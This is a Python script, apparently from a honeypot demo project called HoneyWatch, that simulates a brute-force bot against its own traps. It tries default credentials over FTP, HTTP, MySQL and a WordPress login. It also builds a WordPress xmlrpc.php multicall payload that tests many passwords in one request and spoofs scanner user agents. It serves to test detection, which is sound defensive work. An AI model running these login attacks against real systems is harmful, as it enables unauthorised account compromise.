"""
HoneyWatch - tools/simular_ataque.py
"Atacante" de prueba para la demo: se conecta a cada trap e intenta
credenciales tipicas (como hace un bot de fuerza bruta).

Uso:
    python tools/simular_ataque.py                       # contra esta PC
    python tools/simular_ataque.py 192.168.1.50          # contra otra PC de la red
    python tools/simular_ataque.py 127.0.0.1 --alt-ports
"""

import argparse
import random
import socket
import struct
import time
import urllib.parse

CREDS = [("root", "root"), ("admin", "admin"), ("admin", "123456"),
         ("root", "toor"), ("user", "password"), ("test", "test"),
         ("pi", "raspberry"), ("oracle", "oracle"), ("postgres", "postgres")]


def ssh(host, port):
    with socket.create_connection((host, port), timeout=5) as s:
        print("   banner:", s.recv(256).decode(errors="replace").strip())
        s.sendall(b"SSH-2.0-libssh2_1.10.0\r\n" + b"\x00\x00\x01\x2c\x0a\x14" + random.randbytes(80))
        time.sleep(0.2)


def ftp(host, port):
    user, pwd = random.choice(CREDS)
    with socket.create_connection((host, port), timeout=5) as s:
        s.recv(256)
        s.sendall(f"USER {user}\r\n".encode()); s.recv(256)
        s.sendall(f"PASS {pwd}\r\n".encode())
        print("   respuesta:", s.recv(256).decode().strip())
        s.sendall(b"QUIT\r\n"); s.recv(256)


def http(host, port):
    user, pwd = random.choice(CREDS)
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall(f"GET /admin HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (sqlmap/1.7)\r\n\r\n".encode())
        print("   respuesta:", s.recv(64).decode(errors="replace").splitlines()[0])
    body = urllib.parse.urlencode({"username": user, "password": pwd})
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall((f"POST /login HTTP/1.1\r\nHost: {host}\r\n"
                   "Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Content-Length: {len(body)}\r\n\r\n{body}").encode())
        s.recv(4096)


def wordpress(host, port):
    user, pwd = random.choice(CREDS)
    # 1) Login normal en wp-login.php
    body = urllib.parse.urlencode({"log": user, "pwd": pwd, "wp-submit": "Acceder"})
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall((f"POST /wp-login.php HTTP/1.1\r\nHost: {host}\r\n"
                   "User-Agent: WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)\r\n"
                   "Content-Type: application/x-www-form-urlencoded\r\n"
                   f"Content-Length: {len(body)}\r\n\r\n{body}").encode())
        print("   wp-login:", s.recv(64).decode(errors="replace").splitlines()[0])
    # 2) Fuerza bruta masiva por xmlrpc.php (varias contrasenas en una peticion)
    calls = "".join(
        "<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        f"<value><string>admin</string></value><value><string>{p}</string></value>"
        "</data></array></value></member></struct></value>"
        for _, p in CREDS)
    xml = ("<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName>"
           f"<params><param><value><array><data>{calls}</data></array></value></param></params></methodCall>")
    with socket.create_connection((host, port), timeout=5) as s:
        s.sendall((f"POST /xmlrpc.php HTTP/1.1\r\nHost: {host}\r\n"
                   "Content-Type: text/xml\r\n"
                   f"Content-Length: {len(xml)}\r\n\r\n{xml}").encode())
        print(f"   xmlrpc: {len(CREDS)} contrasenas en una peticion ->",
              s.recv(64).decode(errors="replace").splitlines()[0])


def mysql(host, port):
    user, _ = random.choice(CREDS)
    with socket.create_connection((host, port), timeout=5) as s:
        hs = s.recv(1024)
        print("   version:", hs[5:hs.index(b"\x00", 5)].decode())
        body = (struct.pack("<I", 0x000FA685) + struct.pack("<I", 16777216) + b"\x21"
                + b"\x00" * 23 + user.encode() + b"\x00" + b"\x14" + random.randbytes(20)
                + b"mysql_native_password\x00")
        s.sendall(struct.pack("<I", len(body))[:3] + b"\x01" + body)
        resp = s.recv(1024)
        print("   respuesta:", resp[13:].decode(errors="replace"))


def scan(host, port):
    with socket.create_connection((host, port), timeout=5):
        pass


def main():
    p = argparse.ArgumentParser()
    p.add_argument("host", nargs="?", default="127.0.0.1")
    p.add_argument("--alt-ports", action="store_true")
    p.add_argument("--rondas", type=int, default=3)
    a = p.parse_args()

    ports = {"SSH": 2222, "FTP": 2121, "HTTP": 8888, "WordPress": 8888, "MySQL": 3307} if a.alt_ports \
        else {"SSH": 22, "FTP": 21, "HTTP": 80, "WordPress": 80, "MySQL": 3306}
    attacks = {"SSH": ssh, "FTP": ftp, "HTTP": http, "WordPress": wordpress, "MySQL": mysql}

    for r in range(1, a.rondas + 1):
        print(f"\n=== Ronda {r}/{a.rondas} contra {a.host} ===")
        for name, fn in attacks.items():
            print(f"-> {name} ({ports[name]})")
            try:
                fn(a.host, ports[name])
                if random.random() < 0.5:
                    scan(a.host, ports[name])  # simula tambien un escaneo
            except OSError as e:
                print(f"   fallo: {e}")
            time.sleep(0.3)
    print("\nListo. Revisa el dashboard.")


if __name__ == "__main__":
    main()
